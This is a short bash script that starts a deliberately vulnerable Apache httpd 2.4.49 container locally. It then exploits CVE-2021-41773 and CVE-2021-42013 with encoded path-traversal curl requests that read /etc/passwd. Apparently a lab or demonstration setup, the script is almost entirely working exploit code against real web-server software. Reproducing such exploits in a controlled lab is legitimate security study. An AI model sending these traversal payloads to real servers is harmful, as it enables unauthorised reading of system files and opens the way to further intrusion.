#!/bin/bash
echo 'booting up docker container for apache httpd 2.4.49...'
# build image if not already created
if ! docker inspect vulnerable-apache > /dev/null 2>&1; then
    docker build . -t vulnerable-apache
fi
docker run -p 4444:80 --rm -d vulnerable-apache
echo 'exploiting CVE-2021-41773 to print contents of /etc/passwd...'
sleep 1
curl '127.0.0.1:4444/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
echo
echo 'exploiting CVE-2021-42013 to print contents of /etc/passwd...'
sleep 1
curl '127.0.0.1:4444/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
